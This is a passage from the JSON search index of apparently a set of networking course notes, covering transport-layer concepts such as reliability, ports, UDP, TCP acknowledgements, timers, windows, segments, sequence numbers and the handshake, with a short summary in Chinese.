</ul>"},{"location":"web/transform/#_7","title":"\u516b\u3001\u603b\u7ed3","text":"<p>\u4f20\u8f93\u5c42\u662f\u7f51\u7edc\u901a\u4fe1\u7684\u201c\u4ea4\u901a\u6307\u6325\u5b98\u201d\uff0c\u6838\u5fc3\u4ef7\u503c\u5728\u4e8e\uff1a 1. \u9694\u79bb\u7f51\u7edc\u5c42\u7684\u590d\u6742\u6027\uff0c\u4e3a\u5e94\u7528\u5c42\u63d0\u4f9b\u7b80\u5355\u63a5\u53e3\uff08\u5982<code>socket</code>\uff09\u3002 2. \u7075\u6d3b\u9002\u914d\u4e0d\u540c\u9700\u6c42\uff08\u53ef\u9760TCP vs \u9ad8\u6548UDP\uff09\u3002 3. \u4fdd\u969c\u6570\u636e\u6709\u5e8f\u3001\u5b8c\u6574\u4ea4\u4ed8\uff08\u6216\u727a\u7272\u53ef\u9760\u6027\u6362\u53d6\u5b9e\u65f6\u6027\uff09\u3002  </p> <p>\u7406\u89e3\u4f20\u8f93\u5c42\u662f\u4f18\u5316\u5e94\u7528\u6027\u80fd\uff08\u5982\u8c03\u6574TCP\u53c2\u6570\uff09\u548c\u89e3\u51b3\u7f51\u7edc\u95ee\u9898\uff08\u5982\u8fde\u63a5\u8d85\u65f6\uff09\u7684\u57fa\u7840\u3002</p>"},{"location":"web/transport/","title":"Transport","text":""},{"location":"web/transport/#transport_layer_principles","title":"Transport Layer Principles","text":""},{"location":"web/transport/#transport_layer_goals","title":"Transport Layer Goals","text":"<ul> <li>reliability</li> <li>demultiplexing</li> <li>flow control and congestion control</li> </ul>"},{"location":"web/transport/#reliability_absraction","title":"Reliability Absraction","text":"<p>Many applications require reliability. However, Layer 3 only provided unreliable, best-effort packet delivery. Packets can be lost (dropped), corrupted, and reordered. Packets can be delayed (e.g. a packet could stuck in a queue waiting to cross a link). In rare cases, packets can even be duplicated.</p> <p>For practical reasons, reliability is implemented at the end hosts, not at intermediate routers.  Also, reliability is implemented in the operating system for convenience, so that applications don\u2019t need to all re-implement their own reliability.</p> <p>We will formalize reliability by defining at-least-once delivery. In this model, the destination must receive every packet, without corruption, at least once, but may receive multiple duplicate copies of a packet. </p>"},{"location":"web/transport/#demultiplexing_with_ports","title":"Demultiplexing with Ports","text":"<p>Suppose that my personal computer has two applications that are both talking to the same server. When packets arrive at my personal computer, they have the same source IP address (server), and the same destination IP address (my computer). How can I tell which packets are meant for which application?</p> <p>In order to distinguish, or demultiplex, which packets are meant for which application, the transport layer header includes an additional port number, which can be used to identify a specific application on an end host.</p> <p>Because the transport layer is implemented in the operating system, these ports are the attachment point where the application connects to the operating system\u2019s network stack. The application knows its own port number, and the operating system knows the port numbers for all the applications, and the matching number is how data is unambiguously transferred between the application and operating system.</p> <p></p> <p>The modern Internet commonly uses the client-server design, where clients access services, and servers provide those services.  - Servers usually listen for requests on well-known ports (port numbers 0-1023). Clients know these ports and can access them to request services.    For example, application-level protocols with well-known port numbers include HTTP (port 80) and SSH (port 22). - By contrast, clients can select their own random port numbers (usually port numbers 1024-65535).    Client port numbers are ephemeral, because the port number can be abandoned after the connection is over, and does not need to be permanent.</p>"},{"location":"web/transport/#bytestream_abstraction","title":"Bytestream Abstraction","text":"<p>Implementing reliability at the transport layer means that the application developer no longer needs to think in terms of individual limited-size packets being sent across the network. Instead, the developer can think in terms of a reliable in-order bytestream. The sender has a stream of bytes with no length limit, and provides this stream to the transport layer. Then, the recipient receives the exact same stream of bytes, in the same order, with no bytes lost.</p>"},{"location":"web/transport/#udp_and_datagrams","title":"UDP and Datagrams","text":"<p>Applications that don\u2019t need reliability can use UDP (User Datagram Protocol)at the transport layer.  - UDP does not provide reliability guarantees. If the application needs a packet to arrive, the application must handle re-sending packets on its own (the transport layer will not re-send packets).  - Messages in UDP are limited to a single packet -- UDP datagram. If the application wants to send larger messages, the application is responsible for breaking up and reassembling those messages.  - Note that UDP still implements the notion of ports for demultiplexing, though.</p> TCP UDP demultiplexing demultiplexing bytestream abstraction datagram abstraction reliability -"},{"location":"web/transport/#tcp_design","title":"TCP Design","text":""},{"location":"web/transport/#reliably_delivering_a_single_packet","title":"Reliably Delivering a Single Packet","text":"<ul> <li>The time it takes for a packet to travel from sender to receiver is the one-way delay. </li> <li>The time it takes for a packet to travel from sender to receiver, plus the time for a reply packet to travel from receiver to sender, is the round-trip time (RTT).</li> </ul> <p>How does the sender know if the packet was successfully received?</p> <p>The receiver can send an acknowledgment (ack) message, confirming that the packet was received.</p> <p>What happens if the packet gets dropped? </p> <p>The sender can maintain a timer. When the timer expires, we can re-send the packet. When the sender receives an ack, the sender can cancel the timer.</p> <p>A good timer length would be the round-trip time. </p> <p>What happens if the ack is dropped?</p> <p>The destination received two copies of the packet. </p> <p>What if the bits are corrupted?</p> <p>We can add a checksum in the transport layer header (different from the IP layer checksum).  When the receiver sees a corrupt packet, it can do two things:  - Either the receiver can explicitly re-send a negative acknowledgement (nack), telling the sender to re-send the packet. - Or, the receiver can drop the corrupt packet and do nothing. Then, the sender will time out and re-send the packet.</p> <p>TCP uses the latter.</p> <p>What if the packets are delayed?</p> <p>If the delay is very long, the sender might time out before the ack arrives. The sender will re-send the packet (so the recipient might get two duplicates), and the sender might get two acks.</p> <p>What if the sender sends one packet, but it\u2019s duplicated in the network, and the recipient receives two copies?</p> <p>The recipient would send two acks, but both the sender and the recipient can safely handle duplicates.</p> <p>In summary, the single-packet reliability protocol is:</p> <p>If you are the sender: Send the packet, and set a timer. If no ack arrives before the timer goes off, re-send the packet and reset the timer. Stop and cancel the timer when the ack arrives.</p> <p>If you are the recipient: If you receive the uncorrupted packet, send an ack. </p> <p>This protocol guarantees at-least-once delivery.</p>"},{"location":"web/transport/#reliably_delivering_multiple_packets","title":"Reliably Delivering Multiple Packets","text":"<p>We could follow the same transmission rules (re-send when timer expires) for every single packet.  To distinguish packets, we can attach a unique sequence number to every packet. Each ack will be related to a specific packet. Sequence numbers can also help us reorder packets if they arrive out of order.</p> <p>When does the sender send each packet? </p> <p>The simplest approach is the stop and wait protocol, where the sender waits for packet i to be acknowledged before sending packet i+1. </p> <p>How can we make this faster? We can send packets in parallel. </p> <p>When a packet is sent, but its corresponding ack has not been received, we call that packet in flight.</p>"},{"location":"web/transport/#window-based_algorithms","title":"Window-Based Algorithms","text":"<p>We set a limit W and say that only W packets can be in flight at any given time. This is the key idea behind window-based protocols, where W is the size of the window.</p> <p>The sender can start by sending W packets. When an ack arrives, we send the next packet in line.</p>"},{"location":"web/transport/#window_size","title":"Window Size","text":"<p>How should W be selected?</p> <ul> <li>We want to fully use our available network capacity (\u201cfill the pipe\u201d). </li> <li>However, we don\u2019t want to overload links, since other people may be using that link (congestion control). </li> <li>We also don\u2019t want to overload the receiver, who needs to receive and process all the packets from the sender (flow control).</li> </ul>"},{"location":"web/transport/#fill_the_pipe","title":"Fill the Pipe","text":""},{"location":"web/transport/#tcp_implement","title":"TCP Implement","text":""},{"location":"web/transport/#tcp_segments","title":"TCP Segments","text":"<p>The application is relying on a bytestream abstraction, and is sending us a continuous stream of bytes. In order to form packets out of bytes in the bytestream, we\u2019ll introduce a unit of data called a TCP segment. </p> <p>The TCP implementation at the sender will collect bytes from the bytestream, one by one, and place those bytes into a TCP segment. When the TCP segment is full, we send that TCP segment, and then start a new TCP segment.</p> <p>Sometimes, the sender wants to send less data than the maximum segment size. In that case, we wouldn\u2019t want the TCP segment to be waiting forever for more bytes that never come. To fix this, we\u2019ll start a timer every time we start filling a new empty segment. If the timer expires, we\u2019ll send the TCP segment, even if it is not full yet.</p> <p></p> <p>Before sending the data in a TCP segment, the sender\u2019s TCP implementation will add a TCP header with relevant metadata (e.g. sequence number, port numbers). Then, the segment and header are passed down to the IP layer, which will attach an IP header and send the packet through the network. The TCP segment, with a TCP header and IP header on top, is sometimes called a TCP/IP packet. Equivalently, this is an IP packet whose payload consists of a TCP header and data.</p> <p></p> <p>How should the maximum segment size (MSS) be set? MSS (TCP segment limit) = MTU (IP packet limit) - IP header size - TCP header size</p>"},{"location":"web/transport/#sequence_numbers","title":"Sequence Numbers","text":"<p>In practice, instead of numbering individual segments, we assign a number to every byte in the bytestream.  Each segment\u2019s header will contain a sequence number corresponding to the number of the first byte in that segment.</p> <p>Each bytestream starts with an initial sequence number (ISN). The sender chooses an ISN and labels the first byte with number ISN+1, and so on.</p> <p>The acknowledgement number says, I have received all bytes up to, but not including, this number. </p> <p>Historically, the ISN was chosen to be random because the designers were concerned about ambiguous sequence numbers if all bytestreams started numbering at 0.  In practice, the ISN is chosen to be random for security reasons.</p>"},{"location":"web/transport/#tcp_state","title":"TCP State","text":"<p>In TCP, both the sender and recipient need to maintain state. - The sender has to remember which bytes have been sent but not acknowledged yet. The sender also has to keep track of various timers.</p> <ul> <li>The recipient has to remember the out-of-order bytes that can\u2019t be delivered to the application yet.</li> </ul> <p>Because TCP requires storing state, each bytestream is called a connection or session, and TCP is a connection-oriented protocol. TCP requires both parties to establish a connection and initialize state before data can be sent. TCP also needs a mechanism to tear down connections to free up the memory allocated for state on both end hosts.</p>"},{"location":"web/transport/#full_duplex","title":"Full Duplex","text":"<p>To support sending messages in both directions, TCP connections are full duplex. Instead of designating one sender and one recipient, both end hosts in the connection can send and receive data simultaneously, in the same connection.</p> <p>To support sending data in both directions, each TCP connection has two bytestreams: A to B, and B to A.</p> <p>Each packet can contain both data and acknowledgement information.  The sequence number would correspond to the sender\u2019s bytestream (the bytes I am sending). The acknowledgement number would correspond to the recipient\u2019s bytestream (the bytes I received from you).</p>"},{"location":"web/transport/#tcp_handshake","title":"TCP Handshake","text":"<p>To establish a TCP connection, the two hosts perform a three-way handshake to agree on the ISNs in each direction.</p>"},{"location":"web/transport/#ending_connections","title":"Ending Connections","text":""},{"location":"web/transport/#piggybacking","title":"Piggybacking","text":"<p>When the recipient gets a packet, if it has no data to send, the recipient has two choices.  - immediately send the ack, with no data to send - wait until it has some data to send, and then send the ack with the new data -- piggybacking</p>"},{"location":"web/transport/#sliding_window","title":"Sliding Window","text":""},{"location":"web/transport/#detecting_loss_and_re-sending_data","title":"Detecting Loss and Re-Sending Data","text":""}]}